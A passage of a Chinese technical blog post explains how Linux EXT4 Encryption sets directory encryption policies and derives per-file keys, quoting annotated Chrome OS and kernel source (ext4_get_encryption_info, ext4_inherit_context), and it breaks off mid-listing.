<h3 id="Set-Encryption-Policy流程-回页首"><a href="#Set-Encryption-Policy流程-回页首" class="headerlink" title="Set Encryption Policy流程 回页首"></a>Set Encryption Policy流程 <a href="#top">回页首</a></h3><p><span id="Set-Encryption-Policy"></span></p>
<p>&emsp;  通过对目标目录的文件描述符进行ioctl 的 EXT4_IOC_SET_ENCRYPTION_POLICY 操作即完成了EXT4 Encryption的加/解密功能的开启，该步骤在完成添加master key后进行，Chrome OS中的相关代码如下清单七所示，通过struct ext4_encryption_policy指定了策略的版本号、文件内容和文件名的加密算法、旗标、master key的识别描述符。</p>
<h4 id="清单七-Chrome-OS-set-encryption-policy的核心代码"><a href="#清单七-Chrome-OS-set-encryption-policy的核心代码" class="headerlink" title="清单七 Chrome OS set encryption policy的核心代码"></a>清单七 Chrome OS set encryption policy的核心代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SetDirectoryKey</span><span class="params">(<span class="keyword">const</span> base::FilePath&amp; dir,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">const</span> brillo::SecureBlob&amp; key_descriptor)</span> </span>&#123;</span><br><span class="line">  DCHECK_EQ(<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(EXT4_KEY_DESCRIPTOR_SIZE),</span><br><span class="line">            key_descriptor.<span class="built_in">size</span>());</span><br><span class="line">  <span class="comment">/*这里的dir代表要开启EXT4 Encryption的目录 */</span></span><br><span class="line">  <span class="function">base::ScopedFD <span class="title">fd</span><span class="params">(HANDLE_EINTR(<span class="built_in">open</span>(dir.value().c_str(),</span></span></span><br><span class="line"><span class="function"><span class="params">                                      O_RDONLY | O_DIRECTORY)))</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (!fd.is_valid()) &#123;</span><br><span class="line">    PLOG(ERROR) &lt;&lt; <span class="string">"Ext4: Invalid directory"</span> &lt;&lt; dir.value();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="comment">/*初始化struct ext4_encryption_policy对象 </span></span><br><span class="line"><span class="comment">   * 指定文件内容的加密算法是AES_256_XTS</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  ext4_encryption_policy policy = &#123;&#125;;</span><br><span class="line">  policy.version = <span class="number">0</span>;</span><br><span class="line">  policy.contents_encryption_mode = EXT4_ENCRYPTION_MODE_AES_256_XTS;</span><br><span class="line">  policy.filenames_encryption_mode = EXT4_ENCRYPTION_MODE_AES_256_CTS;</span><br><span class="line">  policy.flags = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// key_descriptor即FEK 的key sig</span></span><br><span class="line">  <span class="built_in">memcpy</span>(policy.master_key_descriptor, key_descriptor.data(),</span><br><span class="line">         EXT4_KEY_DESCRIPTOR_SIZE);</span><br><span class="line">  <span class="comment">/*通过ioctl完成设置*/</span></span><br><span class="line">  <span class="keyword">if</span> (ioctl(fd.<span class="built_in">get</span>(), EXT4_IOC_SET_ENCRYPTION_POLICY, &amp;policy) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    PLOG(ERROR) &lt;&lt; <span class="string">"Failed to set the encryption policy of "</span> &lt;&lt; dir.value();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<p>&emsp;  内核对EXT4_IOC_SET_ENCRYPTION_POLICY的ioctl在ext4_ioctl函数中完成响应，从应用程序中接收ext4_encryption_policy，解析其参数，若是首次对该目录进行加密设置则生成一个ext4_encryption_context 数据结构保存包括版本号、文件内容的加密算法、文件名的加密算法、旗标、master key descriptor、nonce在内的所有信息到目录对应inode的xattr中。从此开始，以该目录做为EXT Encryption加密的根目录，其下文件和子目录的除了nonce需要再次单独产生外，其余加密属性均继承自该目录。若非首次对该目录进行EXT4 Encryption设置，则重点比较当前设置是否与先前的设置一致。首先介绍首次设置的情形， ext4_ioctl的函数调用关系如图三所示。</p>
<center>          
![](ext4-ioctl-firsttime.png "图三")   
图三 首次进行EXT4 Encryption设置的函数调用关系
</center>

<p>&emsp;  应用程序进行ioctl系统调用经过VFS，最终调用ext4_ioctl函数，借助图三的函数调用可看到进行EXT4 Encryption policy设置时都进行了什么操作。首先判断目录所在的文件系统是否支持EXT4 Encryption操作，具体在ext4_has_feature_encrypt 函数中通过判断superblock的s_es-&gt;s_feature_incompat是否支持ENCRYPT属性；然后利用copy_from_user函数从用户空间拷贝ext4_encryption_policy到内核空间；紧接着在ext4_process_policy函数里将ext4_encryption_policy转换成ext4_encryption_context保存到inode的attr；最后将加密目录对应的inode的修改保存到磁盘。重点部分在ext4_process_policy函数，主要分三大步骤，第一步还是进行照例检查校验，包括：访问权限、ext4_encryption_policy的版本号、目标目录是否为空目录、目标目录是否已经存在ext4_encryption_context；第二步为目标目录生成ext4_encryption_context并保存到xattr；最后提交修改的保存请求。第一步的具体操作表现在函数操作上如下：<br>● inode_owner_or_capable() 完成DAC方面的权限检查<br>● 对ext4_encryption_policy的版本号version进行检查，当前仅支持版本0<br>● ext4_inode_has_encryption_context()尝试读取目标目录对应的inode的xattr的EXT4 Encryption字段”c”，看是否存在内容，若存在内容，则说明目标目录在先前已经进行过EXT4 Encryption设置<br>● S_ISDIR()校验目标目录是否真的是目录<br>● ext4_empty_dir()判断目标目录是否为空目录，在首次设置EXT4 Encryption时，仅支持对空目录进行操作。这点有别于eCryptfs，eCryptfs加密文件所在的目录下支持非加密和加密文件的同时存在；而EXT4 Encryption要么是全加密，要么是全非加密。<br>&emsp;  第二步在ext4_create_encryption_context_from_policy函数中完成，具体如下：<br>● ext4_convert_inline_data()对inline data做处理<br>● ext4_valid_contents_enc_mode()校验ext4_encryption_policy的文件内容加密模式是否为AES_256_XTS，当前仅支持该算法的内容加密<br>● ext4_valid_filenames_enc_mode()校验ext4_encryption_policy的文件名加密模式是否为AES_256_CTS，当前仅支持该算法的内容名加密<br>● 对ext4_encryption_policy的flags做检验<br>● get_random_bytes()产生16 Bytes的随机数，赋值给ext4_encryption_context的nonce，其他如master key descriptor、flags、文件内容加密模式、文件名加密模式等值，从ext4_encryption_policy中获取，完成目标目录对应的ext4_encryption_context的初始化<br>● ext4_xattr_set()将用于目标目录的ext4_encryption_context保存到inode的xattr<br>● ext4_set_inode_flag()将目标目录对应inode的i_flags设置成EXT4_INODE_ENCRYPT，表明其属性。后续在文件open、read、write时通过该标志进行判断<br>&emsp;  最后使用ext4_journal_start、ext4_mark_inode_dirty、ext4_journal_stop等函数完成xattr数据回写到磁盘的请求。<br>&emsp;  若非首次对目标目录进行EXT4 Encryption设置，请流程如图四所示，通过ext4_xattr_get函数读取对应inode的xattr的EXT4 Encryption字段”c”对应的内容，即保存的ext4_encryption_context，将其与ext4_encryption_policy的相应值进行对比，若不一致返回-EINVAL。        </p>
<center>          
![](ext4-ioctl-no-firsttime.png "图四")   
图四 非首次进行EXT4 Encryption设置的函数调用关系
</center>

<p>&emsp;  相比eCryptfs，此EXT4_IOC_SET_ENCRYPTION_POLICY的ioctl的作用类似eCryptfs的”mount –t ecryptfs ”操作。</p>
<h3 id="creat-file流程-回页首"><a href="#creat-file流程-回页首" class="headerlink" title="creat file流程 回页首"></a>creat file流程 <a href="#top">回页首</a></h3><p><span id="EXT4-Encryption-file-creat"></span></p>
<p>&emsp;  creat file流程特指应用程序通过creat()函数或open( , O_CREAT, )在已经通过EXT4_IOC_SET_ENCRYPTION_POLICY ioctl完成EXT4 Encryption设置的目录下新建普通文件的过程。希望通过介绍该过程，可以帮助读者了解如何创建加密文件，如何利用master key和nonce生成derived key。<br>&emsp;  应用程序使用creat()函数通过系统调用经由VFS，在申请到fd、初始化好nameidata 、struct file等等之后利用ext4_create()函数完成加密文件的创建，函数调用关系如图五所示。<br>&emsp;  创建加密文件的核心函数ext4_create()的函数调用关系如图六所示，函数主要功能是创建ext4 inode节点并初始化，这里只关注EXT4 Encryption部分。在创建时首先判断其所在目录inode的i_flags是否已经被设置了EXT4_INODE_ENCRYPT属性（该属性在EXT4_IOC_SET_ENCRYPTION_POLICY ioctl或者在EXT4 Encryption根目录下的任何地方新建目录/文件时完成i_flags设置），若是则表明需要进行EXT4 Encryption；接着读取新文件所在目录，即其父目录的xattr属性获取到ext4_encryption_context，再为新文件生成新的nonce，将nonce替换父目录的ext4_encryption_context中的nonce生成用于新文件的ext4_encryption_context并保存到新文件对应inode的xattr中；然后用ext4_encryption_context中的master key descriptor匹配到keyring中的master key，将ext4_encryption_context中的nonce做为密钥对master key进行AES-128-ECB加密，得到derived key；最后使用derived key和AES-256-XTS初始化kernel crypto API，将初始化好的tfm保存到 ext4_crypt_info 的ci_ctfm成员中，再将ext4_crypt_info保存到ext4_inode_info的i_crypt_info，后续对新文件进行读写操作时直接取出ci_ctfm做具体的加/解密即可。</p>
<center>          
![](creat-open-file.png "图五")   
图五 creat和open file函数调用关系
</center>

<center>          
![](ext4_create.png "图六")   
图六 ext4_create函数调用关系
</center>

<p>&emsp;  具体到图六中ext4_create函数调用关系中各个要点函数，完成的功能如下：<br>● ext4_encrypted_inode()判断文件父目录的inode的i_flags是否已经被设置了EXT4_INODE_ENCRYPT属性<br>● ext4_get_encryption_info()读取父目录的xattr属性获取到ext4_encryption_context，并为父目录生成derived key，初始化好tfm并保存到其ext4_inode_info的i_crypt_info<br>● ext4_encryption_info()确认父目录的ext4_inode_info的i_crypt_info已经初始化好<br>● ext4_inherit_context()为新文件创建ext4_encryption_context并保存到其xattr中，并为新文件生成derived key，初始化好tfm并保存到其ext4_inode_info的i_crypt_info<br>&emsp;  从上可看到ext4_get_encryption_info()和ext4_inherit_context()是最关键的部分，其代码如清单八和清单九所示，代码较长，但强烈建议耐心读完。</p>
<h4 id="清单八-ext4-get-encryption-info函数"><a href="#清单八-ext4-get-encryption-info函数" class="headerlink" title="清单八 ext4_get_encryption_info函数"></a>清单八 ext4_get_encryption_info函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ext4_get_encryption_info</span><span class="params">(struct inode *inode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_inode_info</span> *<span class="title">ei</span> = <span class="title">EXT4_I</span>(<span class="title">inode</span>);</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_crypt_info</span> *<span class="title">crypt_info</span>;</span></span><br><span class="line">	<span class="keyword">char</span> full_key_descriptor[EXT4_KEY_DESC_PREFIX_SIZE +</span><br><span class="line">				 (EXT4_KEY_DESCRIPTOR_SIZE * <span class="number">2</span>) + <span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> *<span class="title">keyring_key</span> = <span class="title">NULL</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_encryption_key</span> *<span class="title">master_key</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_encryption_context</span> <span class="title">ctx</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">ukp</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ext4_sb_info</span> *<span class="title">sbi</span> = <span class="title">EXT4_SB</span>(<span class="title">inode</span>-&gt;<span class="title">i_sb</span>);</span> </span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">crypto_ablkcipher</span> *<span class="title">ctfm</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *cipher_str;</span><br><span class="line">	<span class="keyword">char</span> raw_key[EXT4_MAX_KEY_SIZE];</span><br><span class="line">	<span class="keyword">char</span> mode;</span><br><span class="line">	<span class="keyword">int</span> res;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//若ext4_inode_info中的i_crypt_info有值，说明先前已经初始化好</span></span><br><span class="line">	<span class="keyword">if</span> (ei-&gt;i_crypt_info)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!ext4_read_workqueue) &#123;</span><br><span class="line">	<span class="comment">/*为readpage时解密初始化read_workqueue，为ext4_crypto_ctx预先创建128个</span></span><br><span class="line"><span class="comment">	*cache，为writepage时用的bounce page创建内存池，为ext4_crypt_info创建slab</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">		res = ext4_init_crypto();</span><br><span class="line">		<span class="keyword">if</span> (res)</span><br><span class="line">			<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*从xattr中读取加密模式、master key descriptor、nonce等加密相关信息到</span></span><br><span class="line"><span class="comment">	*ext4_encryption_context</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	res = ext4_xattr_get(inode, EXT4_XATTR_INDEX_ENCRYPTION,</span><br><span class="line">				 EXT4_XATTR_NAME_ENCRYPTION_CONTEXT,</span><br><span class="line">				 &amp;ctx, <span class="keyword">sizeof</span>(ctx));</span><br><span class="line">	<span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!DUMMY_ENCRYPTION_ENABLED(sbi))</span><br><span class="line">			<span class="keyword">return</span> res;</span><br><span class="line">		ctx.contents_encryption_mode = EXT4_ENCRYPTION_MODE_AES_256_XTS;</span><br><span class="line">		ctx.filenames_encryption_mode =</span><br><span class="line">			EXT4_ENCRYPTION_MODE_AES_256_CTS;</span><br><span class="line">		ctx.flags = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (res != <span class="keyword">sizeof</span>(ctx))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	crypt_info = kmem_cache_alloc(ext4_crypt_info_cachep, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!crypt_info)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据获取到的ext4_encryption_context内容初始化ext4_crypt_info</span></span><br><span class="line">	crypt_info-&gt;ci_flags = ctx.flags;</span><br><span class="line">	crypt_info-&gt;ci_data_mode = ctx.contents_encryption_mode;</span><br><span class="line">	crypt_info-&gt;ci_filename_mode = ctx.filenames_encryption_mode;</span><br><span class="line">	crypt_info-&gt;ci_ctfm = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(crypt_info-&gt;ci_master_key, ctx.master_key_descriptor,</span><br><span class="line">	       <span class="keyword">sizeof</span>(crypt_info-&gt;ci_master_key));</span><br><span class="line">	<span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode))</span><br><span class="line">		mode = crypt_info-&gt;ci_data_mode;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode) || S_ISLNK(inode-&gt;i_mode))</span><br><span class="line">		mode = crypt_info-&gt;ci_filename_mode;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		BUG();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span> (mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> EXT4_ENCRYPTION_MODE_AES_256_XTS:</span><br><span class="line">		cipher_str = <span class="string">"xts(aes)"</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> EXT4_ENCRYPTION_MODE_AES_256_CTS:</span><br><span class="line">		cipher_str = <span class="string">"cts(cbc(aes))"</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		printk_once(KERN_WARNING</span><br><span class="line">			    <span class="string">"ext4: unsupported key mode %d (ino %u)\n"</span>,</span><br><span class="line">			    mode, (<span class="keyword">unsigned</span>) inode-&gt;i_ino);</span><br><span class="line">		res = -ENOKEY;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (DUMMY_ENCRYPTION_ENABLED(sbi)) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(raw_key, <span class="number">0x42</span>, EXT4_AES_256_XTS_KEY_SIZE);</span><br><span class="line">		<span class="keyword">goto</span> got_key;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//实际使用时将master key descriptor加上”ext4:”的前缀用于匹配master key</span></span><br><span class="line">	<span class="built_in">memcpy</span>(full_key_descriptor, EXT4_KEY_DESC_PREFIX,</span><br><span class="line">	       EXT4_KEY_DESC_PREFIX_SIZE);</span><br><span class="line">	<span class="built_in">sprintf</span>(full_key_descriptor + EXT4_KEY_DESC_PREFIX_SIZE,</span><br><span class="line">		<span class="string">"%*phN"</span>, EXT4_KEY_DESCRIPTOR_SIZE,</span><br><span class="line">		ctx.master_key_descriptor);</span><br><span class="line">	full_key_descriptor[EXT4_KEY_DESC_PREFIX_SIZE +</span><br><span class="line">			    (<span class="number">2</span> * EXT4_KEY_DESCRIPTOR_SIZE)] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用master key descriptor为匹配条件向keyring申请master key</span></span><br><span class="line">	keyring_key = request_key(&amp;key_type_logon, full_key_descriptor, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(keyring_key)) &#123;</span><br><span class="line">		res = PTR_ERR(keyring_key);</span><br><span class="line">		keyring_key = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//确保master key的type是logon类型，防止应用程序读取到key的内容</span></span><br><span class="line">	<span class="keyword">if</span> (keyring_key-&gt;type != &amp;key_type_logon) &#123;</span><br><span class="line">		printk_once(KERN_WARNING</span><br><span class="line">			    <span class="string">"ext4: key type must be logon\n"</span>);</span><br><span class="line">		res = -ENOKEY;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	down_read(&amp;keyring_key-&gt;sem);</span><br><span class="line">	<span class="comment">//从keyring中取出master key的payload</span></span><br><span class="line">	ukp = user_key_payload(keyring_key);</span><br><span class="line">	<span class="keyword">if</span> (ukp-&gt;datalen != <span class="keyword">sizeof</span>(struct ext4_encryption_key)) &#123;</span><br><span class="line">		res = -EINVAL;</span><br><span class="line">		up_read(&amp;keyring_key-&gt;sem);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//取出master key的有效数据ext4_encryption_key</span></span><br><span class="line">	master_key = (struct ext4_encryption_key *)ukp-&gt;data;</span><br><span class="line">	BUILD_BUG_ON(EXT4_AES_128_ECB_KEY_SIZE !=</span><br><span class="line">		     EXT4_KEY_DERIVATION_NONCE_SIZE);</span><br><span class="line">	<span class="keyword">if</span> (master_key-&gt;<span class="built_in">size</span> != EXT4_AES_256_XTS_KEY_SIZE) &#123;</span><br><span class="line">		printk_once(KERN_WARNING</span><br><span class="line">			    <span class="string">"ext4: key size incorrect: %d\n"</span>,</span><br><span class="line">			    master_key-&gt;<span class="built_in">size</span>);</span><br><span class="line">		res = -ENOKEY;</span><br><span class="line">		up_read(&amp;keyring_key-&gt;sem);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*以nonce做为密钥，采用AES_128_ECB算法，利用kernel crypto API加密master</span></span><br><span class="line"><span class="comment">	* key（master_key-&gt;raw），生成derived key保存在raw_key里</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	res = ext4_derive_key_aes(ctx.nonce, master_key-&gt;raw,</span><br><span class="line">				  raw_key);</span><br><span class="line">	up_read(&amp;keyring_key-&gt;sem);</span><br><span class="line">	<span class="keyword">if</span> (res)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">got_key:</span><br><span class="line">	<span class="comment">//为AES_256_XTS加密算法申请tfm</span></span><br><span class="line">	ctfm = crypto_alloc_ablkcipher(cipher_str, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ctfm || IS_ERR(ctfm)) &#123;</span><br><span class="line">		res = ctfm ? PTR_ERR(ctfm) : -ENOMEM;</span><br><span class="line">		printk(KERN_DEBUG</span><br><span class="line">		       <span class="string">"%s: error %d (inode %u) allocating crypto tfm\n"</span>,</span><br><span class="line">		       __func__, res, (<span class="keyword">unsigned</span>) inode-&gt;i_ino);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line">	crypt_info-&gt;ci_ctfm = ctfm;</span><br><span class="line">	crypto_ablkcipher_clear_flags(ctfm, ~<span class="number">0</span>);</span><br><span class="line">	crypto_tfm_set_flags(crypto_ablkcipher_tfm(ctfm),</span><br><span class="line">			     CRYPTO_TFM_REQ_WEAK_KEY);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//向kernel crypto接口里设置加密用的key为derived key</span></span><br><span class="line">	res = crypto_ablkcipher_setkey(ctfm, raw_key,</span><br><span class="line">				       ext4_encryption_key_size(mode));</span><br><span class="line">	<span class="keyword">if</span> (res)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*将初始化好的ext4_crypt_info 实例crypt_info拷贝到inode的ext4_inode_info 的*i_crypt_info。</span></span><br><span class="line"><span class="comment">	*后续加/解密文件内容时直接取出ext4_inode_info的i_crypt_info，即可从中获取</span></span><br><span class="line"><span class="comment">	*到已经初始化好的tfm接口c_ctfm，用其直接加/解密</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">if</span> (cmpxchg(&amp;ei-&gt;i_crypt_info, <span class="literal">NULL</span>, crypt_info) == <span class="literal">NULL</span>)</span><br><span class="line">		crypt_info = <span class="literal">NULL</span>;</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">if</span> (res == -ENOKEY)</span><br><span class="line">		res = <span class="number">0</span>;</span><br><span class="line">	key_put(keyring_key);</span><br><span class="line">	ext4_free_crypt_info(crypt_info);</span><br><span class="line">	memzero_explicit(raw_key, <span class="keyword">sizeof</span>(raw_key));</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">`</span><br></pre></td></tr></table></figure>

<h4 id="清单九-ext4-inherit-context函数"><a href="#清单九-ext4-inherit-context函数" class="headerlink" title="清单九 ext4_inherit_context函数"></a>清单九 ext4_inherit_context函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ext4_inherit_context</span><span class="params">(struct inode *parent, struct inode *child)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_encryption_context</span> <span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ext4_crypt_info</span> *<span class="title">ci</span>;</span></span><br><span class="line">	<span class="keyword">int</span> res;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//确保其父目录inode对应的i_crypt_info已经初始化好</span></span><br><span class="line">	res = ext4_get_encryption_info(parent);</span><br><span class="line">	<span class="keyword">if</span> (res &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取父目录的保存在i_crypt_info的ext4_crypt_info信息</span></span><br><span class="line">	ci = EXT4_I(parent)-&gt;i_crypt_info;</span><br><span class="line">	